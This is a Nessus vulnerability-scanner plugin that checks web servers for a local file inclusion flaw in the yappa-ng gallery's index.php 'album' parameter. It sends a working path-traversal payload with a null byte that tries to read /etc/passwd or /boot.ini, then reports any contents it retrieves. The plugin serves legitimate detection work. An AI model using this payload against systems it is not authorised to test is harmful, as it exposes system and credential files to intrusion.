#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34448);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2008-4626");
  script_bugtraq_id(31828);
  script_osvdb_id(49171);
  script_xref(name:"EDB-ID", value:"6788");
  script_xref(name:"Secunia", value:"32325");

  script_name(english:"yappa-ng index.php album Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running yappa-ng, an open source photo gallery
application written in PHP. 

The version of yappa-ng installed on the remote host fails to sanitize
user input to the 'album' parameter of the 'index.php' script before
using it to include PHP code.  An unauthenticated attacker can
leverage this issue to view arbitrary files or possibly to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"yappa-ng 2.3.2 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/10/21");
 script_cvs_date("$Date: 2016/05/20 14:30:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
traversal = crap(data:"../", length:3*9) + '..';


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/yappa-ng", "/yappa", "/photos", "/fotos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Loop through files to look for.
  foreach file (files)
  {
    # Try to read a file's contents.
    url = string(
      dir, "/index.php?", 
      "album=", traversal, file, "%00"
    );

    r = http_send_recv3(method: "GET", item:url, port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we see the expected contents.
    pat = file_pats[file];
    if ("yappa-ng" >< res && egrep(pattern:pat, string:res))
    {
      if (report_verbosity)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          contents = strstr(res, "LEFT Album Navigation Bar END");
          if ("<td width" >< contents)
          {
            contents = strstr(contents, "<td width");
            contents = strstr(contents, '\n') - '\n';
          }
          if ("</td>" >< contents) contents = contents - strstr(contents, "</td>");

          if (egrep(pattern:pat, string:contents)) contents = chomp(contents);
          else contents = res;

          report += string(
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:contents), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
